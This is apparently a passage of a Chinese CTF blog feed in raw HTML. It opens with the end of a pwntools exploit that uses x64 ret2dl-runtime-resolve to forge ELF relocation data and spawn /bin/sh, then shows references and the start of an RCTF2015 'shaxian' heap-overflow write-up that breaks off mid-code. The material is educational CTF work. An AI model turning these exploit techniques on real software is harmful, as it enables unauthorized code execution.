  unsigned char st_other; /* 符号的可见性 */ 1byte</span></span><br><span class="line"><span class="string">    Elf64_Section st_shndx; /* 节头表索引 */ 2byte</span></span><br><span class="line"><span class="string">    Elf64_Addr    st_value; /* 符号的值，可能是地址或偏移 */ 8byte</span></span><br><span class="line"><span class="string">    Elf64_Xword   st_size;  /* 符号的大小 */ 8byte</span></span><br><span class="line"><span class="string">&#125; Elf64_Sym;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x64_sym_data</span><span class="params">(name_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(name_offset) + p32(<span class="number">0x12</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">内存布局：</span></span><br><span class="line"><span class="string">0x600910 - 0x600930 Adjust buffer address</span></span><br><span class="line"><span class="string">0x600930 - 0x600940 system_got</span></span><br><span class="line"><span class="string">0x600940 - 0x600F20 0x5E0</span></span><br><span class="line"><span class="string">0x600F20 - 0x600F40 shellcode</span></span><br><span class="line"><span class="string">0x600F40 - 0x600F88 0x50</span></span><br><span class="line"><span class="string">0x600F88 - 0x600FA8 reloc_data (align 0x18) </span></span><br><span class="line"><span class="string">0x600FA8 - 0x600FB0 0x8</span></span><br><span class="line"><span class="string">0x600FB0 - 0x600FD0 sym_data (align 0x18)</span></span><br><span class="line"><span class="string">0x600FD0 - 0x600FE0 func_name("system")</span></span><br><span class="line"><span class="string">0x600FE0 - 0x600FF0 binsh_str("/bin/sh")</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">DT_JMPREL = <span class="number">0x400360</span></span><br><span class="line">DT_SYMTAB = <span class="number">0x400280</span></span><br><span class="line">DT_STRTAB = <span class="number">0x4002E0</span></span><br><span class="line">DT_VERSYM = <span class="number">0x40031E</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x600910</span></span><br><span class="line">system_got = bss_addr + <span class="number">0x20</span></span><br><span class="line">buff_addr = bss_addr + <span class="number">0x610</span></span><br><span class="line">main_addr = <span class="number">0x400505</span></span><br><span class="line">PLT0 = <span class="number">0x4003D0</span></span><br><span class="line">p_rdi_ret = <span class="number">0x400593</span></span><br><span class="line">leave_ret = <span class="number">0x400520</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reloc_data_addr(0x600F88) = DT_JMPREL(0x400360) + reloc_index(0x155D7)*3*8</span></span><br><span class="line">reloc_index = <span class="number">0x155D7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sym_data_addr(0x600FB0) = DT_SYMTAB(0x400280) + sym_index(0x155E2)*3*8  </span></span><br><span class="line">reloc_data_addr = <span class="number">0x600F88</span></span><br><span class="line">reloc_data = generate_x64_reloc_data(<span class="number">0x155E2</span>,system_got)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x600FD0) = DT_STRTAB(0x4002E0) + name_offset(0x200CF0)</span></span><br><span class="line">sym_data_addr = <span class="number">0x600FB0</span></span><br><span class="line">sym_data = generate_x64_sym_data(<span class="number">0x200CF0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x600FD0) = sym_data_addr(0x600FB0) + 0x20</span></span><br><span class="line">func_name_addr = <span class="number">0x600FD0</span></span><br><span class="line">func_name = <span class="string">"system\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_str_addr(0x600FE0) = func_name_addr(0x600FD0) + 0x10</span></span><br><span class="line">binsh_str_addr = <span class="number">0x600FE0</span></span><br><span class="line">binsh_str = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_data_to_address</span><span class="params">(address,data)</span>:</span></span><br><span class="line">    length = len(data)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Data length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        length += <span class="number">16</span> - length % <span class="number">16</span></span><br><span class="line">    payload = data.ljust(length,<span class="string">'\x90'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Payload length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length,<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 'A'*0x10---RBP---ret_addr  buffer的地址使用RBP-0x10算出</span></span><br><span class="line">        <span class="comment"># raw_input('---------Adjust buffer address---------')</span></span><br><span class="line">        io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(address + <span class="number">0x10</span> + i) + p64(main_addr))</span><br><span class="line">        <span class="comment"># raw_input('-------------Send payload-------------')</span></span><br><span class="line">        io.send(payload[i:i+<span class="number">16</span>] + p64(bss_addr + <span class="number">0x10</span>) + p64(main_addr)) <span class="comment"># 每次只能往内存中写0x10字节数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># modify versym dynamic addr(.gnu.version) </span></span><br><span class="line">    <span class="comment"># DT_VERSYM(0x40031E) - sym_index(0x155E2)*2 = 0x3D575A or 0x6006F0 - sym_index(0x155E2)*2 = 0x5D5B2C</span></span><br><span class="line">    <span class="comment"># raw_input('---------[1] Before modify versym dynamic address---------')</span></span><br><span class="line">    write_data_to_address(<span class="number">0x600858</span>,p64(<span class="number">0x6FFFFFF0</span>) + p64(<span class="number">0x3D575A</span>)) <span class="comment"># versym + sym_index*2 可被访问</span></span><br><span class="line">    <span class="comment"># raw_input('---------[2] Before send reloc_data---------')</span></span><br><span class="line">    write_data_to_address(reloc_data_addr,reloc_data)</span><br><span class="line">    <span class="comment"># raw_input('---------[3] Before send sym_data---------')</span></span><br><span class="line">    write_data_to_address(sym_data_addr,sym_data)</span><br><span class="line">    <span class="comment"># raw_input('---------[4] Before send func_name---------')</span></span><br><span class="line">    write_data_to_address(func_name_addr,func_name)</span><br><span class="line">    <span class="comment"># raw_input('---------[5] Before send binsh_str---------')</span></span><br><span class="line">    write_data_to_address(binsh_str_addr,binsh_str)</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p64(p_rdi_ret) + p64(binsh_str_addr)<span class="comment"># "/bin/sh"</span></span><br><span class="line">    shellcode += p64(PLT0) + p64(reloc_index)</span><br><span class="line">    write_data_to_address(buff_addr,shellcode) <span class="comment">#</span></span><br><span class="line">    <span class="comment"># raw_input('-------------Before send adjust rsp code-------------')</span></span><br><span class="line">    io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr - <span class="number">0x8</span>) + p64(leave_ret))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><span id="Ref1">[ 01 ]：程序员的自我修养—链接、装载与库</span><br><span id="Ref2">[ 02 ]：<a href="https://blog.csdn.net/u011298001/article/details/84951584" target="_blank" rel="noopener">ELF文件系列第五篇ELF文件静态结构中的重定位项</a></span><br><span id="Ref3">[ 03 ]：<a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener">glibc/elf/elf.h</a></span><br><span id="Ref4">[ 04 ]：<a href="https://www.cnblogs.com/vo1ad0r/p/11585025.html" target="_blank" rel="noopener">聊聊动态链接和dl_runtime_resolve</a></span><br><span id="Ref5">[ 05 ]：Linux二进制分析</span><br><span id="Ref6">[ 06 ]：<a href="https://xz.aliyun.com/t/6364" target="_blank" rel="noopener">dl-resolve浅析</a></span><br><span id="Ref7">[ 07 ]：<a href="https://bbs.ichunqiu.com/thread-44816-1-1.html" target="_blank" rel="noopener">Linux pwn入门教程(10)——针对函数重定位流程的几种攻击</a></span><br><span id="Ref8">[ 08 ]：<a href="https://blog.csdn.net/qq_36495104/article/details/106061223" target="_blank" rel="noopener">详细解析ret2_dl_runtime_resolve</a></span><br><span id="Ref9">[ 09 ]：<a href="https://docs.oracle.com/cd/E56344_01/html/E54069/chapter6-26.html" target="_blank" rel="noopener">Oracle® Solaris 11.2 链接程序和库指南</a></span><br><span id="Ref10">[ 10 ]：<a href="https://blog.csdn.net/jazrynwong/article/details/89851640" target="_blank" rel="noopener">glibc动态链接器dl_runtime_resolve简要分析</a></span><br><span id="Ref11">[ 11 ]：<a href="https://blog.csdn.net/lzshlzsh/article/details/6066628" target="_blank" rel="noopener">Linux下库函数动态链接过程分析－结合glibc-2.11源码</a></span><br><span id="Ref12">[ 12 ]：<a href="https://forum.90sec.com/t/topic/260" target="_blank" rel="noopener">ret2dl x64 &amp; x32的差异</a></span><br><span id="Ref13">[ 13 ]：<a href="https://blog.csdn.net/seaaseesa/article/details/104478081" target="_blank" rel="noopener">ret2dl-runtime-resolve详细分析(32位&amp;64位)</a></span></p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RCTF2015——WriteUp(Pwn)</title>
      <link href="/2020/07/19/RCTF2015%E2%80%94%E2%80%94WriteUp(Pwn)/"/>
      <url>/2020/07/19/RCTF2015%E2%80%94%E2%80%94WriteUp(Pwn)/</url>
      <content type="html"><![CDATA[<blockquote><p>RCTF2015 Pwn题题解<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p></blockquote><h2 id="shaxian-pwn400"><a href="#shaxian-pwn400" class="headerlink" title="shaxian-pwn400"></a>shaxian-pwn400</h2><h3 id="0x00-检查程序开启的保护机制"><a href="#0x00-检查程序开启的保护机制" class="headerlink" title="0x00 检查程序开启的保护机制"></a>0x00 检查程序开启的保护机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec shaxian</span><br><span class="line">[*] &apos;/home//Desktop/remote-dbg/shaxian&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到程序开启了<code>Partial RELRO</code>(部分重定位只读)，在这种情况下，<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。又开启了<code>Canary</code>检测是否有栈溢出，开启了<code>NX(DEP)</code>使堆栈上的代码不可执行。</p><h3 id="0x10-静态分析"><a href="#0x10-静态分析" class="headerlink" title="0x10 静态分析"></a>0x10 静态分析</h3><p>&emsp;&emsp;这是一个<code>32位</code>的<code>ELF</code>程序，我们通过IDA的反汇编功能对其反汇编并对函数名和变量名重命名后，<code>主函数</code>伪代码如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choose; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">30u</span>);                                   <span class="comment">// 30秒的闹钟</span></span><br><span class="line">  close_buffer();</span><br><span class="line">  banner();</span><br><span class="line">  input_your_message();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts_menu();</span><br><span class="line">    choose = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( choose == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( choose )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Diancai();                              <span class="comment">// 1、点菜</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Submit();                               <span class="comment">// 2、提交订单</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        Receipt();                              <span class="comment">// 3、收据信息</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Review();                               <span class="comment">// 4、回顾</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:                                   <span class="comment">// 5、退出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">input_your_message</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your Address:"</span>);</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;Address_buf, <span class="number">256</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your Phone number:"</span>);</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;Phone_number_buf, <span class="number">256</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Thank you."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">puts_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.WO YAO DIAN CAI"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.Submit"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.I want Receipt"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.Review"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5.Exit"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"choose:"</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们可以看到这是一个<code>菜单式</code>的交互程序。此程序的大致功能分为<code>5部分</code>：</p><blockquote><p>1、点菜。<br>2、提交订单。<br>3、索要收据。<br>4、查看购物车。<br>5、退出程序。</p></blockquote><p>&emsp;&emsp;在进入菜单前，程序会要求输入客户的信息：客户的<code>地址</code>和<code>电话</code>。这两个数据都存在<code>.bss段</code>上，大小均为<code>256字节</code>。</p><p>&emsp;&emsp;分析功能前，先看一下，用于存储订单信息的<code>购物车结构体</code>。此结构体拥有三个结构体成员。<code>count</code>：存储某种菜的数量。<code>food_type</code>：存储菜的名字。<code>next</code>：存储前一个购物车结构体的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 shopping_cart_struct struc ; (sizeof=0x28, mappedto_5)                                  </span><br><span class="line">00000000 count           dd ?</span><br><span class="line">00000004 food_type       db 32 dup(?)</span><br><span class="line">00000024 next            dd ?</span><br><span class="line">00000028 shopping_cart_struct ends</span><br></pre></td></tr></table></figure></p><p>1、<code>点菜</code>：通过一个购物车结构体(shopping_cart_struct)的<code>单链表</code>，将用户输入的<code>菜的类型</code>和<code>数量</code>数据存储在<code>堆</code>中。<code>.bss段</code>上的head_ptr_0804B1C0变量为此单链表的<code>头指针</code>，也是最后所点的菜的信息结构体指针。其中使用<code>input_message()函数</code>读入菜的名字，存入<code>food_type</code>成员变量中。input_message()函数有<code>四个参数</code>，分别表示：文件描述符，缓冲区地址，最大读取长度，读取终止符(\n)。我们知道<code>food_type</code>只有<code>32字节</code>大小，而这里input_message()函数却可以最大读入<code>60字节</code>数据，这会造成<code>next指针</code>被覆盖，形成<code>堆溢出</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Diancai</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  shopping_cart_struct *tmp_ptr; <span class="comment">// ebx</span></span><br><span class="line">  shopping_cart_struct *tmp_head_ptr; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  tmp_head_ptr = head_ptr_0804B1C0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"CHI SHEN ME?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.Banmian"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.Bianrou"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.Qingtangmian"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.Jianbao"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5.Jianjiao"</span>);</span><br><span class="line">  head_ptr_0804B1C0 = (shopping_cart_struct *)<span class="built_in">malloc</span>(<span class="number">40u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !head_ptr_0804B1C0 )                     <span class="comment">// buffer分配出错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Error"</span>);</span><br><span class="line">  head_ptr_0804B1C0-&gt;next = (<span class="keyword">int</span>)tmp_head_ptr;</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)head_ptr_0804B1C0-&gt;food_type, <span class="number">60</span>, <span class="number">10</span>);<span class="comment">// 漏洞点,堆溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many?"</span>);</span><br><span class="line">  tmp_ptr = head_ptr_0804B1C0;</span><br><span class="line">  tmp_ptr-&gt;count = get_num();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Add to GOUWUCHE"</span>);                      <span class="comment">// 购物车数量+1</span></span><br><span class="line">  <span class="keyword">return</span> shopping_cart++ + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">input_message</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> buf, <span class="keyword">int</span> max_len, <span class="keyword">int</span> Linefeed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; max_len - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(fd, (<span class="keyword">void</span> *)(i + buf), <span class="number">1u</span>) &lt;= <span class="number">0</span> ) <span class="comment">// 读取发生错误</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + buf) == (_BYTE)Linefeed )<span class="comment">// LF == 0xA,换行符</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 返回正常读取的字节数</span></span><br><span class="line">  *(_BYTE *)(i + buf) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>2、<code>提交订单</code>：打印购物车中的订单信息，并将堆上用于存储菜的类型和数量数据的<code>堆块</code>进行<code>释放</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Submit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  shopping_cart_struct *free_ptr; <span class="comment">// ST1C_4</span></span><br><span class="line">  shopping_cart_struct *tmp_head_ptr; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  tmp_head_ptr = head_ptr_0804B1C0;</span><br><span class="line">  <span class="keyword">if</span> ( !shopping_cart )                         <span class="comment">// 购物车为空</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"DIANCAI first"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    print_food_list(tmp_head_ptr);</span><br><span class="line">    free_ptr = tmp_head_ptr;</span><br><span class="line">    tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(free_ptr);                             <span class="comment">// 释放结构体内存</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Your order has been submitted!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>3、<code>索要收据</code>：输入收据抬头信息。抬头信息也存储于<code>.bss段</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Receipt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Taitou:"</span>);</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;Title, <span class="number">256</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Taitou saved"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>4、<code>查看购物车</code>：通过购物车结构体(shopping_cart_struct)的<code>单链表</code>，<code>循环</code>将购物车中的订单内容打印出来。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Review</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  shopping_cart_struct *tmp_head_ptr; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  tmp_head_ptr = head_ptr_0804B1C0;</span><br><span class="line">  <span class="keyword">if</span> ( shopping_cart )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Cart:"</span>);</span><br><span class="line">    <span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s * %d\n"</span>, tmp_head_ptr-&gt;food_type, tmp_head_ptr-&gt;count);</span><br><span class="line">      tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Total:%d\n"</span>, shopping_cart);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nothing in cart"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Address:%s\n"</span>, &amp;Address_buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Phone:%s\n"</span>, &amp;Phone_number_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Title:%s\n"</span>, &amp;Title);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;由于程序是<code>堆溢出</code>，而且大小是<code>40+8</code>(presize+size)，因此可以利用<code>fastbin</code>结构进行堆块的利用。<code>泄露信息部分</code>较为简单，因为结构体中自带了<code>next指针</code>，这个地方是可以覆盖的，所以直接覆盖后，在<code>打印信息</code>的时候就可以泄露相关的<code>got表信息</code>。打印信息部分如下所示：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( shopping_cart )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Cart:"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( tmp_head_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s * %d\n"</span>, tmp_head_ptr-&gt;food_type, tmp_head_ptr-&gt;count);</span><br><span class="line">    tmp_head_ptr = (shopping_cart_struct *)tmp_head_ptr-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Total:%d\n"</span>, shopping_cart);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Nothing in cart"</span>);</span><br><span 